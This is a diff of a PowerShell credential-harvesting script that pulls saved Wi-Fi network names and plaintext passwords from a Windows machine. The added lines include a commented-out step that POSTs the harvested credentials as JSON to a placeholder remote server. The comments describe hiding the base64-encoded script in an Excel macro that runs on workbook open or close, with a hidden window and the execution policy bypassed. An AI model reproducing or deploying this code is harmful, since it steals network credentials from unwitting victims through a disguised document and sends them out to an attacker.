@@ -19,15 +19,30 @@ $ssidNetwork = ($ssidProfiles -split ":").Trim() | % {
         $splitPW = ($pw -split ":")[-1].Trim()
 
         # echos the essid : password to the object
-        echo "$_ : $splitPW"
+        # echo "$_ : $splitPW"
+
+        $obj = new-object psobject -Property @{
+            essid=$_ 
+            psk=$splitpw
+            }
+        $obj
     }
 }
+
+$ssidNetwork
+$ssidNetwork | Format-Table essid, psk
+
+## Converts to JSON and then uploads to remote server via REST API ##
+# $json = $ssidNetwork | ConvertTo-Json
+# $json
+# Invoke-RestMethod -URI 'http://your.web.server.address/api/call/method' -Method POST -ContentType 'application/json' -Body $json
+
 
 # writes object to file
 # NOTE: must use an absolute path to a directory with write permissions
 # if you use relative path the write will fail due to the $pwd being
 # the path that PowerShell is installed in.
-$ssidNetwork | Out-File C:\absolute\path to\results.txt
+# $ssidNetwork | Out-File C:\absolute\path to\results.txt
 
 # in order to convert to BASE64 and have the code execute correctly
 # it must be writtent to one line using ";" after each line
@@ -47,7 +62,10 @@ $ssidNetwork | Out-File C:\absolute\path to\results.txt
 ## makes the function run on open ##
 # Private Sub Workbook_Open()
 #
-#     strCmd = "powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass" & _
+## makes the function run on close ##
+# Private Sub Workbook_Close()
+#
+#     strCmd = "powershell.exe -NoProfile -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass" & _
 #          "-EncondedCommand ***enterBASE64 endcoded command here**"
 #
 ## Defines Obj ##
